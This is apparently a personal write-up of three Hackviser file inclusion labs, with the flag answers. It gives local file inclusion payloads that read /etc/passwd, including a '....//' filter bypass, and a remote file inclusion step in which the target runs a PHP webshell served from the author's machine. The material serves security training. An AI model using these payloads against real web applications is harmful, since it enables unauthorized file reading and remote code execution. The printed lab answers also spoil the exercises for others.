---
title: 'File Inclusion'
date: '2026-05-28'
excerpt: 'Practice File Inclusion attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  May 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">File Inclusion</h1>
<div class="writeup-date">May 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice file inclusion attacks in multiple lab exercises.</p>

<h5 class="mb-2"><strong>1. Basic File Inclusion</strong></h5>
<p class="mb-3">This lab contains a Local File Inclusion (LFI) vulnerability that leads to unauthorized access to local files within the system. The content of the 404 error page you see in the web application is fetched from the path in the "page" parameter in the URL. By changing the "page" parameter, you can access other files on the system. What is the username of the last user added in /etc/passwd?</p>
<p class="mb-3">The following is displayed on page load. Notice the page parameter <code>page=404.php</code>.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_fileinclusion/basicfileinclusion_hackviser_image1.png" alt="Basic File Inclusion 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Once we try the payload <code>//etc/passwd</code>, we see the file being loaded and the last added user is shown.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_fileinclusion/basicfileinclusion_hackviser_image2.png" alt="Basic File Inclusion 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> pioneer</p>
<br />

<h5 class="mb-2"><strong>2. Local File Inclusion Filter Bypass</strong></h5>
<p class="mb-3">This lab contains a Local File Inclusion (LFI) vulnerability that leads to unauthorized access to local files within the system. The content of the 404 error page you see in the web application is fetched from the path in the "page" parameter in the URL. By changing the "page" parameter, you can access other files on the system. "/" and ".." are blocked to prevent LFI vulnerability. Find a way to bypass this restriction. What is the username of the last user added in /etc/passwd?</p>
<p class="mb-3">The following is displayed on page load. Notice the page parameter <code>page=404.php</code>.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_fileinclusion/lfifilterbypass_hackviser_image1.png" alt="LFI Filter Bypass 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">After a few attempts, we try the payload <code>....//....//....//....//etc/passwd</code> and it works.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_fileinclusion/lfifilterbypass_hackviser_image2.png" alt="LFI Filter Bypass 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> sunflower</p>
<br />

<h5 class="mb-2"><strong>3. Basic Remote File Inclusion</strong></h5>
<p class="mb-3">This lab contains a Remote File Inclusion (RFI) vulnerability that leads to remote code execution, allowing the attacker to run arbitrary code hosted on a remote server. The content of the 404 error page you see in the web application is fetched from the path in the "page" parameter in the URL. A file from a remote system can be included in the page by changing the "page" parameter. You should serve the payload on HackerBox or on your own computer using a VPN. What is the hostname of the server on which the website runs?</p>
<p class="mb-3">The following is displayed on page load. Notice the page parameter <code>page=404.php</code>.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_fileinclusion/basicremotefileinclusion_hackviser_image1.png" alt="Basic Remote File Inclusion 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">First we create a webshell file using <code>vi webshell.txt</code> that contains this line of code <code>&lt;?php system(&apos;hostname&apos;); ?&gt;</code>. The reason why we use a <code>.txt</code> instead of a <code>.php</code> extension is that we need our local server to transmit the raw PHP code as plain text. If we used a <code>.php</code> extension, a standard web server might attempt to execute the script locally before sending it, delivering only a blank response to the target. By serving it as a text file, our Python server simply transfers the unexecuted source code across the network, allowing the target server's vulnerable <code>include()</code> function to pull it in and force its own PHP interpreter to execute the command. Then we serve it from our machine using <code>python3 -m http.server 8000</code>.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_fileinclusion/basicremotefileinclusion_hackviser_image2.png" alt="Basic Remote File Inclusion 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Now when we append <code>local_IP:8000/webshell.txt</code> to the page parameter, we see the target's hostname appearing.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_fileinclusion/basicremotefileinclusion_hackviser_image3.png" alt="Basic Remote File Inclusion 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> imperial</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>